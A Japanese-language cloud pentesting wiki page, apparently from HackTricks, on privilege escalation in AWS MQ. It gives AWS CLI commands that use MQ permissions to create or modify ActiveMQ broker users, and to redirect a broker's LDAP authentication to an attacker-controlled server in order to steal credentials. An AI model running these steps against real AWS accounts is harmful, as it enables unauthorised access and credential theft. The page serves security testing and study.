# AWS - MQ Privesc

{{#include ../../../banners/hacktricks-training.md}}

## MQ

MQに関する詳細情報は、以下を確認してください：

{{#ref}}
../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

これらの権限を持つことで、**ActimeMQブローカーに新しいユーザーを作成できます**（これはRabbitMQでは機能しません）：
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**潜在的な影響:** ActiveMQを通じて機密情報にアクセスする

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

これらの権限を持つと、**ActiveMQブローカーに新しいユーザーを作成できます**（これはRabbitMQでは機能しません）：
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**潜在的な影響:** ActiveMQを通じて機密情報にアクセスする

### `mq:ListBrokers`, `mq:UpdateBroker`

ブローカーが**ActiveMQ**で**LDAP**を使用して認証を行っている場合、攻撃者が**制御するもの**に**LDAPサーバーの設定**を**変更**することが可能です。これにより、攻撃者は**LDAPを通じて送信されるすべての資格情報を盗む**ことができます。
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
もしActiveMQで使用されている元の認証情報を見つけることができれば、MitMを実行し、認証情報を盗み、元のサーバーでそれを使用し、応答を送信することができます（おそらく盗まれた認証情報を再利用するだけでこれを行うことができます）。

**潜在的な影響:** ActiveMQの認証情報を盗む

{{#include ../../../banners/hacktricks-training.md}}
